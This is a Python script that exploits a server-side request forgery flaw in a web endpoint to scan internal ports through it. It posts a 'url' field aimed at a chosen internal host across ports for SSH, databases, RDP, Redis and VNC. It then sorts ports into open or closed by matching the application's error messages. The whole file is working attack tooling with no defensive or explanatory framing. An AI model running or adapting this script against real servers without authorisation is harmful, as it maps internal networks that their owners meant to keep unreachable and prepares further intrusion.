#!/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t','--targets', help='hosts to target, seperated by a space', required=True, nargs='+')
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s','--ssrf', help='ssrf target', required=True)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

ports = ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000']

for target in args.targets:
    for p in ports:
        try:
            r = requests.post(url=target, json={"url":"{host}:{port}".format(host=args.ssrf,port=int(p))}, timeout=int(args.timeout))

            if args.verbose:
                print("{target} Port {port:0} \t {msg}".format(target=target, port=int(p), msg=r.text))

            if "You don't have permission to access this." in r.text:
                print("{target} Port {port:0} \t OPEN - returned permission error, therefore valid resource".format(target=target, port=int(p)))
            elif "ECONNREFUSED" in r.text:
                print("{target} Port {port:0} \t CLOSED".format(target=target, port=int(p)))        
            elif "Request failed with status code 404" in r.text:
                print("{target} Port {port:0} \t OPEN - returned 404".format(target=target, port=int(p)))
            elif "Parse Error:" in r.text:
                print("{target} Port {port:0} \t ???? - returned parse error, potentially open non-http".format(target=target, port=int(p)))
            elif "socket hang up" in r.text:
                print("{target} Port {port:0} \t OPEN - socket hang up, likely non-http".format(target=target, port=int(p)))
            else:
                print("{target} Port {port:0} \t {msg}".format(target=target, port=int(p), msg=r.text))
        except requests.exceptions.Timeout:
            print("{target} Port {port:0} \t timed out".format(target=target, port=int(p)))